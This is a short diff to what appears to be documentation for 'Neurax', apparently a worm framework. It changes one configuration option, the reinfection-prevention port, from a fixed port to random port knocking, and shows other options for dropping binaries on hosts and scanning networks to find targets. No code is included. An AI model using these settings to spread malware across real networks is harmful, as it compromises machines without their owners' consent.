@@ -47,7 +47,7 @@ neurax_config.platform         - Platform to target, currently only Windows and 
 neurax_config.path             - The path under which binary is saved on the host (default: random)
 neurax_config.file_name        - Name under which downloaded binary should be served and then saved (default: random)
 neurax_config.base64           - Encode the transferred binary in base64 (default: false)
-neurax_config.prevent_reinfect - Indicates whether port 7123 should be opened to prevent multiple infections of the same host (default: true)
+neurax_config.prevent_reinfect - Indicates whether a random port should be opened for knocking to prevent multiple infections of the same host (default: true)
 neurax_config.required_port    - Neurax_scan() treats host as active only when it has a specific port opened (default: none)
 neurax_config.scan_passive     - Neurax_scan() detects hosts using passive ARP monitoring (default: false)
 neurax_config.cidr             - Neurax_scan() scans this CIDR (default: local IP + "\24")
